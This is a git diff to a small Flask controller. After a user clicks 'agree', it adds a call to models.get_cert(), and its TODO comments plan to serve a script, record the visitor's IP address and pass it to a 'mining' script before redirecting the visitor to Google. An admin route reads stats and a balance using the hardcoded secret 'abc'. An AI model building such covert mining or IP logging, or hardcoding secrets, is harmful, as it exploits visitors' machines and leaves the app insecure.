@@ -1,6 +1,5 @@
 #!/usr/bin/env python3
 
- 
 from flask import Blueprint, render_template, request, redirect, session
 import operator
 from . import models
@@ -13,6 +12,7 @@ def welcome():
         return render_template('welcome.html')
     else:
         if request.form['submit'] == 'agree':
+            models.get_cert()
             #TODO serve script from models
             #TODO locate current IP address, append to txt file, and pass onto mining py file
             return redirect ('http://www.google.com', code = 302)
@@ -21,4 +21,10 @@ def welcome():
 
 @controller.route('/Admin', methods = ['GET','POST'])
 def admin():
-    pass
+    if request.method == 'GET':
+        secret_key = 'abc'
+        stats = models.get_stats(secret_key)
+        balance = models.get_balance(secret_key)
+        return render_template('admin.html', stats=stats, balance=balance)
+    else:
+        return render_template('admin.html')
